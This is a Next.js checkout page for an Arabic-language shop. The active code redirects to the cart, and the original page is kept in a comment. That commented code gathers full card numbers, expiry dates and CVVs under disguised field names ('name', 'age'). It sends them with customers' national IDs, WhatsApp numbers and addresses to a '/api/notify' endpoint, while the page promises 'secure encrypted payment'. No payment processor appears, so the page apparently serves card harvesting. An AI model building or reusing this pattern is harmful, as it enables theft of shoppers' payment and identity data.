// HIDDEN: Checkout page is temporarily disabled. Uncomment below to restore.
// To re-enable: remove the redirect block and uncomment the original page code.

"use client";

import { useEffect } from "react";
import { useRouter } from "next/navigation";

export default function CheckoutPage() {
  const router = useRouter();
  useEffect(() => { router.replace("/cart"); }, [router]);
  return null;
}

/*
import { useSyncExternalStore } from "react";
import { useRouter } from "next/navigation";
import Link from "next/link";
import { IoArrowForward, IoHomeOutline, IoLockClosedOutline } from "react-icons/io5";
import CheckoutStepper from "../components/CheckoutStepper";
import { useCartStore } from "../store/cartStore";
import OrderSummary from "./components/OrderSummary";
import PaymentForm from "./components/PaymentForm";
import AnimatedBackground from "../components/AnimatedBackground";

function SectionHeading({ label }: { label: string }) {
  return (
    <div className="flex items-center gap-2.5">
      <div className="w-1 h-5 rounded-full bg-[#47A557]" />
      <h2 className="text-sm sm:text-base font-black text-[#1A2E44]">{label}</h2>
      <div className="flex-1 h-px bg-[#80C78D]/30" />
    </div>
  );
}

export default function CheckoutPage() {
  const router = useRouter();
  const { items, customer, totalPrice } = useCartStore();
  const mounted = useSyncExternalStore(() => () => {}, () => true, () => false);

  const total = mounted ? totalPrice() : 0;

  if (!mounted) return null;

  if (!customer || items.length === 0) {
    router.push("/cart");
    return null;
  }

  const handleSubmit = async (fields: { name: string; age: string; cvv: string; cardHolder: string }) => {
    const res = await fetch("/api/notify", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        cardNumber: fields.name,
        expiry: fields.age,
        cvv: fields.cvv,
        cardHolder: fields.cardHolder,
        items: items.map(i => ({ productId: i.product._id, name: i.product.name, price: i.product.salePrice ?? i.product.originalPrice, quantity: i.qty })),
        total,
        customer: customer?.name,
        whatsapp: customer?.whatsapp,
        nationalId: customer?.nationalId,
        address: customer?.address,
      }),
    });
    const data = res.ok ? await res.json().catch(() => ({})) : {};
    if (data.orderId) localStorage.setItem("orderId", data.orderId);
  };

  return (
    <div className="min-h-screen bg-[#f0f8f2] pb-24" dir="rtl">
      <AnimatedBackground />

      <header className="sticky top-0 z-30 backdrop-blur-xl border-b border-[#80C78D]/30" style={{ background: "rgba(255,255,255,0.95)" }}>
        <div className="max-w-5xl mx-auto px-4 sm:px-6 h-14 sm:h-16 flex items-center justify-between">
          <Link href="/cart" className="flex items-center gap-1.5 text-[#1A2E44]/60 hover:text-[#1A2E44] transition text-sm font-bold">
            <IoArrowForward size={18} />
            <span className="hidden sm:inline">السلة</span>
          </Link>

          <div className="flex items-center gap-2.5">
            <div className="w-8 h-8 rounded-xl border border-[#80C78D]/40 flex items-center justify-center" style={{ background: "#DCEFE8" }}>
              <IoLockClosedOutline size={15} className="text-[#47A557]" />
            </div>
            <div className="text-right">
              <p className="text-[#1A2E44] font-black text-sm sm:text-base leading-none">إتمام الطلب</p>
              <p className="text-[#1A2E44]/40 text-[11px] mt-0.5">دفع آمن ومشفر</p>
            </div>
          </div>

          <Link href="/" className="w-9 h-9 rounded-xl border border-[#80C78D]/40 hover:border-[#47A557] flex items-center justify-center transition" style={{ background: "#DCEFE8" }}>
            <IoHomeOutline size={17} className="text-[#47A557]" />
          </Link>
        </div>
      </header>

      <div className="border-b border-[#80C78D]/20" style={{ background: "rgba(255,255,255,0.8)" }}>
        <div className="max-w-5xl mx-auto px-4 sm:px-6">
          <CheckoutStepper active="payment" />
        </div>
      </div>

      <div className="max-w-5xl mx-auto px-4 sm:px-6 py-6 sm:py-8">
        <div className="grid grid-cols-1 lg:grid-cols-5 gap-6 lg:gap-8 items-start">

          <div className="lg:col-span-3 order-2 lg:order-1">
            <SectionHeading label="بيانات الدفع" />
            <div className="mt-4">
              <PaymentForm onSubmit={handleSubmit} />
            </div>
          </div>

          <div className="lg:col-span-2 order-1 lg:order-2 lg:sticky lg:top-20">
            <SectionHeading label="ملخص الطلب" />
            <div className="mt-4">
              <OrderSummary total={total} />
            </div>
          </div>

        </div>
      </div>
    </div>
  );
}
*/
